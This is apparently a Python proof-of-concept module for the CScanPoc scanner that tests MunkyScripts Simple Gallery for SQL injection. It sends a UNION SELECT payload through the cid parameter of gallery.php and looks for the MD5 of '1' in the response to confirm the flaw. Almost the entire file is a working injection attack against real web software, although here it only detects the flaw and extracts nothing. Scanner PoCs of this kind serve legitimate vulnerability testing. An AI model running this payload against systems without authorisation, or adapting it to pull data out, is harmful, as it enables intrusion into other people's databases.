# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'MunkyScripts_0000'  # 平台漏洞编号
    name = 'MunkyScripts Simple Gallery SQL Injection Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        MunkyScripts Simple Gallery gallery.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-68151'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MunkyScripts'  # 漏洞组件名称
    product_version = 'MunkyScripts Simple Gallery'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c77db581-9e44-45fd-bcab-d385d8ce09da'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/gallery.php?cid='/**/UNION/**/SELECT/**/1,2,(concat_ws(0x3a,md5(1))),4 %23"
            response = requests.get(arg + payload)

            if response:
                m = re.search(r'c4ca4238a0b923820dcc509a6f75849b',
                              response.text)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
